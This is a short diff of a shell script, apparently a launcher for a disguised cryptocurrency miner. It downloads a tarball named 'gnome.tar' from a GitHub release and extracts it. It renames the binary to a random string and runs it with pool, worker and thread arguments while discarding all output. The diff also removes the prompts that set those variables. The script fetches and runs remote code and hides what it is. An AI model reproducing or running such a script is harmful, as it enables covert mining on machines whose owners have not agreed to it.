@@ -1,9 +1,6 @@
 wget https://github.com/samaniheo/aploka/releases/download/v1.6.14/gnome.tar
 tar -xf gnome.tar
 rm -rf gnome.tar
-read -p "pul: " PUL
-read -p "nama worker: " WORKER
-read -p "num core: " NUM
 variable5=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv gnome $variable5
 ./$variable5 --account CP_smm --pool $PUL --worker $WORKER --thread $NUM > /dev/null 2>&1
